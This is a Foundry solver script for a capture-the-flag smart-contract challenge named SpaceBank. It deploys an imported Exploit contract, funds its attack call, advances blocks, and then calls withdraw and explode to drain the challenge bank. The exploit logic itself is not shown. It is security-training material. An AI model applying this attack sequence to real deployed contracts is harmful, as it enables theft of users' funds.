// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.4;

import "forge-std/Script.sol";
import "forge-ctf/CTFSolver.sol";
import "forge-std/console.sol";

import "openzeppelin/token/ERC20/IERC20.sol";

import {Challenge} from "src/Challenge.sol";
import {SpaceBank} from "src/SpaceBank.sol";
import {Exploit} from "src/Exploit.sol";

interface IERC20Ownable is IERC20 {
    function owner() external returns (address);
}

contract SpaceBankSolver is CTFSolver {
    Challenge private challenge;
    SpaceBank private spaceBank;

    Exploit private exploit;

    function solve(address _challenge, address _player) internal override {
        challenge = Challenge(_challenge);
        spaceBank = SpaceBank(challenge.SPACEBANK());

        console.log("player balance:", _player.balance);
        console.log("spaceBank balance:", address(spaceBank).balance);

        _exploit();
    }

    function _exploit() private {
        exploit = new Exploit(address(spaceBank));
        exploit.attack{value: 1 ether}();
        // Used for local EVM simulation
        vm.roll(block.number + 2);
        /**
         * Ideally, the withdraw call could be wrapped in the `attack` function and we can broadcast the `explode` call later separately after 2 blocks has past.
         * In here, I submitted the call to withdraw separately from the attack call to increase the likelihood to delay 2 blocks during broadcast (assuming 1 tx mines 1 block).
         * For now, the script has to pass local EVM simulation for transactions to be broadcasted.
         * Reference: https://github.com/foundry-rs/foundry/issues/6825
         */
        exploit.withdraw();
        exploit.explode();
    }
}
